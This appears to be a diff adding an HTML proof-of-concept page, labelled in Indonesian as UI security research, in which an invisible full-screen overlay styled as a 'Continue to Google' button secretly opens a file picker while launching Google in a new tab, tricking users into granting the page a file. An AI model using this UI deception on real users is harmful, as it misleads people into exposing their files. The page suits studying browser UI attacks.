@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Penelitian Keamanan UI - File Picker</title>
+    <style>
+        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
+        #overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            display: flex; align-items: center; justify-content: center;
+            cursor: pointer; z-index: 9999;
+        }
+        .btn { padding: 20px 40px; background: #1a73e8; color: white; border-radius: 8px; font-weight: bold; font-size: 1.2rem; }
+        #fileInput { display: none; }
+    </style>
+</head>
+<body>
+
+    <input type="file" id="fileInput">
+
+    <div id="overlay">
+        <div class="btn">Lanjutkan ke Google</div>
+    </div>
+
+    <script>
+        const overlay = document.getElementById('overlay');
+        const fileInput = document.getElementById('fileInput');
+
+        overlay.addEventListener('click', () => {
+            // STRATEGI: Pemicuan Simultan sesuai permintaan
+            
+            // 1. Picu File Picker terlebih dahulu
+            fileInput.click();
+
+            // 2. Langsung buka tab baru di baris berikutnya
+            window.open('https://www.google.com', '_blank');
+        });
+
+        // Logika tambahan untuk mendeteksi apakah file berhasil terambil oleh tab "jahat"
+        fileInput.onchange = (e) => {
+            if (e.target.files.length > 0) {
+                alert('File berhasil diakses oleh tab latar belakang: ' + e.target.files.name);
+            }
+        };
+    </script>
+</body>
+</html>
